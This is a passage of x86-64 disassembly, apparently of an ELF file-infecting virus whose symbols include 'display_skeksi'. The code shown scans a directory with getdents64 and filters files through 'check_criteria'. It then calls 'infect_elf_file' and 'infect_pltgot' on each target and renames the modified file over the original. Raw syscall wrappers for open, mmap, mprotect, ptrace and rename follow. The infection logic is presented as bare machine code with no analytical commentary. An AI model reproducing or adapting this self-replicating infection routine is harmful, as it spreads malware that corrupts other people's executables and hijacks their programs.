  401d82:	ba 00 00 00 00       	mov    edx,0x0
  401d87:	be 00 00 01 00       	mov    esi,0x10000
  401d8c:	48 89 c7             	mov    rdi,rax
  401d8f:	e8 e2 02 00 00       	call   402076 <_open>
  401d94:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax
  401d97:	83 7d e4 00          	cmp    DWORD PTR [rbp-0x1c],0x0
  401d9b:	0f 88 92 02 00 00    	js     402033 <do_main+0x38b>
  401da1:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401da8:	48 89 c7             	mov    rdi,rax
  401dab:	e8 92 f0 ff ff       	call   400e42 <load_self>
  401db0:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401db3:	48 8d 8d 90 7f ff ff 	lea    rcx,[rbp-0x8070]
  401dba:	ba 00 80 00 00       	mov    edx,0x8000
  401dbf:	48 89 ce             	mov    rsi,rcx
  401dc2:	89 c7                	mov    edi,eax
  401dc4:	e8 92 05 00 00       	call   40235b <_getdents64>
  401dc9:	89 45 e0             	mov    DWORD PTR [rbp-0x20],eax
  401dcc:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401dd0:	0f 88 60 02 00 00    	js     402036 <do_main+0x38e>
  401dd6:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401dda:	0f 84 f5 01 00 00    	je     401fd5 <do_main+0x32d>
  401de0:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
  401de7:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401dee:	e9 d1 01 00 00       	jmp    401fc4 <do_main+0x31c>
  401df3:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401df6:	48 98                	cdqe   
  401df8:	48 8d 95 90 7f ff ff 	lea    rdx,[rbp-0x8070]
  401dff:	48 01 d0             	add    rax,rdx
  401e02:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401e06:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e0a:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401e0e:	0f b7 c0             	movzx  eax,ax
  401e11:	83 e8 01             	sub    eax,0x1
  401e14:	01 45 fc             	add    DWORD PTR [rbp-0x4],eax
  401e17:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e1b:	48 83 c0 13          	add    rax,0x13
  401e1f:	48 8d 35 2f 10 00 00 	lea    rsi,[rip+0x102f]        # 402e55 <display_skeksi+0x122>
  401e26:	48 89 c7             	mov    rdi,rax
  401e29:	e8 10 0e 00 00       	call   402c3e <_strcmp>
  401e2e:	85 c0                	test   eax,eax
  401e30:	0f 84 80 01 00 00    	je     401fb6 <do_main+0x30e>
  401e36:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e3a:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
  401e3e:	3c 2e                	cmp    al,0x2e
  401e40:	0f 84 73 01 00 00    	je     401fb9 <do_main+0x311>
  401e46:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e4a:	48 8d 48 13          	lea    rcx,[rax+0x13]
  401e4e:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  401e52:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401e56:	48 89 c6             	mov    rsi,rax
  401e59:	48 89 cf             	mov    rdi,rcx
  401e5c:	e8 4b e6 ff ff       	call   4004ac <full_path>
  401e61:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401e65:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401e69:	48 89 c7             	mov    rdi,rax
  401e6c:	e8 b9 fc ff ff       	call   401b2a <check_criteria>
  401e71:	85 c0                	test   eax,eax
  401e73:	0f 88 43 01 00 00    	js     401fbc <do_main+0x314>
  401e79:	83 7d f4 00          	cmp    DWORD PTR [rbp-0xc],0x0
  401e7d:	74 43                	je     401ec2 <do_main+0x21a>
  401e7f:	c7 45 9c 0a 00 00 00 	mov    DWORD PTR [rbp-0x64],0xa
  401e86:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401e8d:	be 00 00 00 00       	mov    esi,0x0
  401e92:	48 89 c7             	mov    rdi,rax
  401e95:	e8 f5 04 00 00       	call   40238f <_gettimeofday>
  401e9a:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401ea1:	48 83 c0 08          	add    rax,0x8
  401ea5:	48 89 c7             	mov    rdi,rax
  401ea8:	e8 6b e5 ff ff       	call   400418 <_rand>
  401ead:	99                   	cdq    
  401eae:	f7 7d 9c             	idiv   DWORD PTR [rbp-0x64]
  401eb1:	89 d0                	mov    eax,edx
  401eb3:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401eb6:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  401eba:	0f 85 ff 00 00 00    	jne    401fbf <do_main+0x317>
  401ec0:	eb 01                	jmp    401ec3 <do_main+0x21b>
  401ec2:	90                   	nop
  401ec3:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401eca:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401ece:	48 89 d6             	mov    rsi,rdx
  401ed1:	48 89 c7             	mov    rdi,rax
  401ed4:	e8 8a f0 ff ff       	call   400f63 <load_target>
  401ed9:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401ee0:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401ee7:	48 89 d6             	mov    rsi,rdx
  401eea:	48 89 c7             	mov    rdi,rax
  401eed:	e8 6c e9 ff ff       	call   40085e <infect_elf_file>
  401ef2:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401ef6:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401efd:	48 89 c7             	mov    rdi,rax
  401f00:	e8 1f f0 ff ff       	call   400f24 <unload_target>
  401f05:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f0c:	48 89 c6             	mov    rsi,rax
  401f0f:	48 8d 3d 9a 0e 00 00 	lea    rdi,[rip+0xe9a]        # 402db0 <display_skeksi+0x7d>
  401f16:	e8 5f f4 ff ff       	call   40137a <load_target_writeable>
  401f1b:	e8 d7 0d 00 00       	call   402cf7 <get_rip>
  401f20:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  401f27:	48 89 d1             	mov    rcx,rdx
  401f2a:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  401f31:	48 29 d1             	sub    rcx,rdx
  401f34:	48 89 ca             	mov    rdx,rcx
  401f37:	48 29 d0             	sub    rax,rdx
  401f3a:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401f3e:	e8 b4 0d 00 00       	call   402cf7 <get_rip>
  401f43:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  401f4a:	48 89 d1             	mov    rcx,rdx
  401f4d:	48 c7 c2 e1 01 40 00 	mov    rdx,0x4001e1
  401f54:	48 29 d1             	sub    rcx,rdx
  401f57:	48 89 ca             	mov    rdx,rcx
  401f5a:	48 29 d0             	sub    rax,rdx
  401f5d:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  401f61:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401f65:	48 2b 45 b0          	sub    rax,QWORD PTR [rbp-0x50]
  401f69:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401f6d:	48 8b 55 b8          	mov    rdx,QWORD PTR [rbp-0x48]
  401f71:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401f75:	48 01 d0             	add    rax,rdx
  401f78:	48 8d 50 40          	lea    rdx,[rax+0x40]
  401f7c:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f83:	48 89 d6             	mov    rsi,rdx
  401f86:	48 89 c7             	mov    rdi,rax
  401f89:	e8 03 f8 ff ff       	call   401791 <infect_pltgot>
  401f8e:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f95:	48 89 c7             	mov    rdi,rax
  401f98:	e8 87 ef ff ff       	call   400f24 <unload_target>
  401f9d:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401fa1:	48 89 c6             	mov    rsi,rax
  401fa4:	48 8d 3d 05 0e 00 00 	lea    rdi,[rip+0xe05]        # 402db0 <display_skeksi+0x7d>
  401fab:	e8 da 01 00 00       	call   40218a <_rename>
  401fb0:	83 45 f4 01          	add    DWORD PTR [rbp-0xc],0x1
  401fb4:	eb 0a                	jmp    401fc0 <do_main+0x318>
  401fb6:	90                   	nop
  401fb7:	eb 07                	jmp    401fc0 <do_main+0x318>
  401fb9:	90                   	nop
  401fba:	eb 04                	jmp    401fc0 <do_main+0x318>
  401fbc:	90                   	nop
  401fbd:	eb 01                	jmp    401fc0 <do_main+0x318>
  401fbf:	90                   	nop
  401fc0:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401fc4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401fc7:	3b 45 e0             	cmp    eax,DWORD PTR [rbp-0x20]
  401fca:	0f 8c 23 fe ff ff    	jl     401df3 <do_main+0x14b>
  401fd0:	e9 db fd ff ff       	jmp    401db0 <do_main+0x108>
  401fd5:	90                   	nop
  401fd6:	83 6d f8 01          	sub    DWORD PTR [rbp-0x8],0x1
  401fda:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  401fde:	7e 0f                	jle    401fef <do_main+0x347>
  401fe0:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401fe3:	89 c7                	mov    edi,eax
  401fe5:	e8 c2 00 00 00       	call   4020ac <_close>
  401fea:	e9 47 fd ff ff       	jmp    401d36 <do_main+0x8e>
  401fef:	c7 45 98 32 00 00 00 	mov    DWORD PTR [rbp-0x68],0x32
  401ff6:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  401ffd:	be 00 00 00 00       	mov    esi,0x0
  402002:	48 89 c7             	mov    rdi,rax
  402005:	e8 85 03 00 00       	call   40238f <_gettimeofday>
  40200a:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  402011:	48 83 c0 08          	add    rax,0x8
  402015:	48 89 c7             	mov    rdi,rax
  402018:	e8 fb e3 ff ff       	call   400418 <_rand>
  40201d:	99                   	cdq    
  40201e:	f7 7d 98             	idiv   DWORD PTR [rbp-0x68]
  402021:	89 d0                	mov    eax,edx
  402023:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  402026:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  40202a:	75 0b                	jne    402037 <do_main+0x38f>
  40202c:	e8 02 0d 00 00       	call   402d33 <display_skeksi>
  402031:	eb 04                	jmp    402037 <do_main+0x38f>
  402033:	90                   	nop
  402034:	eb 01                	jmp    402037 <do_main+0x38f>
  402036:	90                   	nop
  402037:	c9                   	leave  
  402038:	c3                   	ret    

0000000000402039 <_getuid>:
  402039:	f3 0f 1e fa          	endbr64 
  40203d:	55                   	push   rbp
  40203e:	48 89 e5             	mov    rbp,rsp
  402041:	48 c7 c0 66 00 00 00 	mov    rax,0x66
  402048:	0f 05                	syscall 
  40204a:	48 89 c0             	mov    rax,rax
  40204d:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402051:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402055:	5d                   	pop    rbp
  402056:	c3                   	ret    

0000000000402057 <Exit>:
  402057:	f3 0f 1e fa          	endbr64 
  40205b:	55                   	push   rbp
  40205c:	48 89 e5             	mov    rbp,rsp
  40205f:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  402063:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402067:	48 89 c7             	mov    rdi,rax
  40206a:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  402071:	0f 05                	syscall 
  402073:	90                   	nop
  402074:	5d                   	pop    rbp
  402075:	c3                   	ret    

0000000000402076 <_open>:
  402076:	f3 0f 1e fa          	endbr64 
  40207a:	55                   	push   rbp
  40207b:	48 89 e5             	mov    rbp,rsp
  40207e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402082:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402086:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40208a:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40208e:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402092:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402096:	48 c7 c0 02 00 00 00 	mov    rax,0x2
  40209d:	0f 05                	syscall 
  40209f:	48 89 c0             	mov    rax,rax
  4020a2:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020a6:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020aa:	5d                   	pop    rbp
  4020ab:	c3                   	ret    

00000000004020ac <_close>:
  4020ac:	f3 0f 1e fa          	endbr64 
  4020b0:	55                   	push   rbp
  4020b1:	48 89 e5             	mov    rbp,rsp
  4020b4:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4020b7:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4020bb:	48 c7 c0 03 00 00 00 	mov    rax,0x3
  4020c2:	0f 05                	syscall 
  4020c4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020c8:	5d                   	pop    rbp
  4020c9:	c3                   	ret    

00000000004020ca <_read>:
  4020ca:	f3 0f 1e fa          	endbr64 
  4020ce:	55                   	push   rbp
  4020cf:	48 89 e5             	mov    rbp,rsp
  4020d2:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020d6:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4020da:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4020de:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020e2:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4020e6:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4020ea:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  4020f1:	0f 05                	syscall 
  4020f3:	48 89 c0             	mov    rax,rax
  4020f6:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020fa:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020fe:	5d                   	pop    rbp
  4020ff:	c3                   	ret    

0000000000402100 <_write>:
  402100:	f3 0f 1e fa          	endbr64 
  402104:	55                   	push   rbp
  402105:	48 89 e5             	mov    rbp,rsp
  402108:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40210c:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402110:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402114:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402118:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40211c:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402120:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  402127:	0f 05                	syscall 
  402129:	48 89 c0             	mov    rax,rax
  40212c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402130:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402134:	5d                   	pop    rbp
  402135:	c3                   	ret    

0000000000402136 <_fstat>:
  402136:	f3 0f 1e fa          	endbr64 
  40213a:	55                   	push   rbp
  40213b:	48 89 e5             	mov    rbp,rsp
  40213e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402142:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402146:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40214a:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40214e:	48 c7 c0 05 00 00 00 	mov    rax,0x5
  402155:	0f 05                	syscall 
  402157:	48 89 c0             	mov    rax,rax
  40215a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40215e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402162:	5d                   	pop    rbp
  402163:	c3                   	ret    

0000000000402164 <_unlink>:
  402164:	f3 0f 1e fa          	endbr64 
  402168:	55                   	push   rbp
  402169:	48 89 e5             	mov    rbp,rsp
  40216c:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402170:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402174:	48 c7 c0 57 00 00 00 	mov    rax,0x57
  40217b:	0f 05                	syscall 
  40217d:	48 89 c0             	mov    rax,rax
  402180:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402184:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402188:	5d                   	pop    rbp
  402189:	c3                   	ret    

000000000040218a <_rename>:
  40218a:	f3 0f 1e fa          	endbr64 
  40218e:	55                   	push   rbp
  40218f:	48 89 e5             	mov    rbp,rsp
  402192:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402196:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40219a:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40219e:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021a2:	48 c7 c0 52 00 00 00 	mov    rax,0x52
  4021a9:	0f 05                	syscall 
  4021ab:	48 89 c0             	mov    rax,rax
  4021ae:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021b2:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021b6:	5d                   	pop    rbp
  4021b7:	c3                   	ret    

00000000004021b8 <_lseek>:
  4021b8:	f3 0f 1e fa          	endbr64 
  4021bc:	55                   	push   rbp
  4021bd:	48 89 e5             	mov    rbp,rsp
  4021c0:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021c4:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4021c8:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  4021cb:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4021cf:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021d3:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  4021d7:	48 c7 c0 08 00 00 00 	mov    rax,0x8
  4021de:	0f 05                	syscall 
  4021e0:	48 89 c0             	mov    rax,rax
  4021e3:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021e7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021eb:	5d                   	pop    rbp
  4021ec:	c3                   	ret    

00000000004021ed <_fsync>:
  4021ed:	f3 0f 1e fa          	endbr64 
  4021f1:	55                   	push   rbp
  4021f2:	48 89 e5             	mov    rbp,rsp
  4021f5:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4021f8:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4021fc:	48 c7 c0 4a 00 00 00 	mov    rax,0x4a
  402203:	0f 05                	syscall 
  402205:	48 89 c0             	mov    rax,rax
  402208:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40220c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402210:	5d                   	pop    rbp
  402211:	c3                   	ret    

0000000000402212 <_mmap>:
  402212:	f3 0f 1e fa          	endbr64 
  402216:	55                   	push   rbp
  402217:	48 89 e5             	mov    rbp,rsp
  40221a:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  40221e:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  402222:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  402226:	48 89 4d c0          	mov    QWORD PTR [rbp-0x40],rcx
  40222a:	4c 89 45 b8          	mov    QWORD PTR [rbp-0x48],r8
  40222e:	4c 89 4d b0          	mov    QWORD PTR [rbp-0x50],r9
  402232:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  402236:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40223a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  40223e:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  402242:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  402246:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40224a:	48 8b 7d d8          	mov    rdi,QWORD PTR [rbp-0x28]
  40224e:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  402252:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  402256:	4c 8b 55 c0          	mov    r10,QWORD PTR [rbp-0x40]
  40225a:	4c 8b 45 f8          	mov    r8,QWORD PTR [rbp-0x8]
  40225e:	4c 8b 4d f0          	mov    r9,QWORD PTR [rbp-0x10]
  402262:	48 c7 c0 09 00 00 00 	mov    rax,0x9
  402269:	0f 05                	syscall 
  40226b:	48 89 c0             	mov    rax,rax
  40226e:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  402272:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402276:	5d                   	pop    rbp
  402277:	c3                   	ret    

0000000000402278 <_munmap>:
  402278:	f3 0f 1e fa          	endbr64 
  40227c:	55                   	push   rbp
  40227d:	48 89 e5             	mov    rbp,rsp
  402280:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402284:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402288:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40228c:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402290:	48 c7 c0 0b 00 00 00 	mov    rax,0xb
  402297:	0f 05                	syscall 
  402299:	48 89 c0             	mov    rax,rax
  40229c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022a0:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022a4:	5d                   	pop    rbp
  4022a5:	c3                   	ret    

00000000004022a6 <_mprotect>:
  4022a6:	f3 0f 1e fa          	endbr64 
  4022aa:	55                   	push   rbp
  4022ab:	48 89 e5             	mov    rbp,rsp
  4022ae:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022b2:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022b6:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  4022b9:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022bd:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022c1:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  4022c5:	48 c7 c0 0a 00 00 00 	mov    rax,0xa
  4022cc:	0f 05                	syscall 
  4022ce:	48 89 c0             	mov    rax,rax
  4022d1:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022d5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022d9:	5d                   	pop    rbp
  4022da:	c3                   	ret    

00000000004022db <_ptrace>:
  4022db:	f3 0f 1e fa          	endbr64 
  4022df:	55                   	push   rbp
  4022e0:	48 89 e5             	mov    rbp,rsp
  4022e3:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022e7:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022eb:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4022ef:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  4022f3:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022f7:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022fb:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4022ff:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402303:	48 c7 c0 65 00 00 00 	mov    rax,0x65
  40230a:	0f 05                	syscall 
  40230c:	48 89 c0             	mov    rax,rax
  40230f:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402313:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402317:	5d                   	pop    rbp
  402318:	c3                   	ret    

0000000000402319 <_prctl>:
  402319:	f3 0f 1e fa          	endbr64 
  40231d:	55                   	push   rbp
  40231e:	48 89 e5             	mov    rbp,rsp
  402321:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402325:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402329:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40232d:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  402331:	4c 89 45 c8          	mov    QWORD PTR [rbp-0x38],r8
  402335:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402339:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40233d:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402341:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402345:	48 c7 c0 9d 00 00 00 	mov    rax,0x9d
  40234c:	0f 05                	syscall 
  40234e:	48 89 c0             	mov    rax,rax
  402351:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402355:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402359:	5d                   	pop    rbp
  40235a:	c3                   	ret    

000000000040235b <_getdents64>:
  40235b:	f3 0f 1e fa          	endbr64 
  40235f:	55                   	push   rbp
  402360:	48 89 e5             	mov    rbp,rsp
  402363:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402366:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40236a:	89 55 e8             	mov    DWORD PTR [rbp-0x18],edx
  40236d:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402371:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402375:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402379:	48 c7 c0 d9 00 00 00 	mov    rax,0xd9
  402380:	0f 05                	syscall 
  402382:	48 89 c0             	mov    rax,rax
  402385:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402389:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40238d:	5d                   	pop    rbp
  40238e:	c3                   	ret    

000000000040238f <_gettimeofday>:
  40238f:	f3 0f 1e fa          	endbr64 
  402393:	55                   	push   rbp
  402394:	48 89 e5             	mov    rbp,rsp
  402397:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40239b:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40239f:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4023a3:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023a7:	48 c7 c0 60 00 00 00 	mov    rax,0x60
  4023ae:	0f 05                	syscall 
  4023b0:	48 89 c0             	mov    rax,rax
  4023b3:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023b7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023bb:	5d                   	pop    rbp
  4023bc:	c3                   	ret    

00000000004023bd <_memcpy>:
  4023bd:	f3 0f 1e fa          	endbr64 
  4023c1:	55                   	push   rbp
  4023c2:	48 89 e5             	mov    rbp,rsp
  4023c5:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  4023c9:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  4023cd:	89 55 cc             	mov    DWORD PTR [rbp-0x34],edx
  4023d0:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4023d4:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  4023d8:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4023dc:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4023e0:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4023e7:	eb 1b                	jmp    402404 <_memcpy+0x47>
  4023e9:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4023ed:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  4023f0:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4023f4:	88 10                	mov    BYTE PTR [rax],dl
  4023f6:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  4023fb:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402400:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402404:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402407:	39 45 cc             	cmp    DWORD PTR [rbp-0x34],eax
  40240a:	77 dd                	ja     4023e9 <_memcpy+0x2c>
  40240c:	90                   	nop
  40240d:	90                   	nop
  40240e:	5d                   	pop    rbp
  40240f:	c3                   	ret    

0000000000402410 <Memset>:
  402410:	f3 0f 1e fa          	endbr64 
  402414:	55                   	push   rbp
  402415:	48 89 e5             	mov    rbp,rsp
  402418:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
